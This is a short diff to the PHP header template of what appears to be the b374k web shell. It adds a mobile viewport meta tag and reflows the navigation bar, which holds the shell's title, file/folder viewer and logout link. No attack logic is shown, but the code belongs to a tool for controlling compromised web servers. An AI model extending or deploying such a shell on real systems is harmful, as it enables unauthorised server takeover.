@@ -9,6 +9,7 @@
 <title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
 <meta charset='utf-8'>
 <meta name='robots' content='noindex, nofollow, noarchive'>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
 <link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
 <style type="text/css">
 <__CSS__>
@@ -26,8 +27,7 @@
 		<!--header info start-->
 		<div id='headerNav'>
 			<span><a onclick="set_cookie('cwd', '');" href='<?php echo get_self(); ?>'><?php echo $GLOBALS['title']." ".$GLOBALS['ver']?></a></span>
-			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />
-			<span id='nav'><?php echo $nav; ?></span>
+			<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' /><span id='nav'>&nbsp;<?php echo $nav; ?></span>
 
 			<a id='logout'>log out</a>
 		</div>
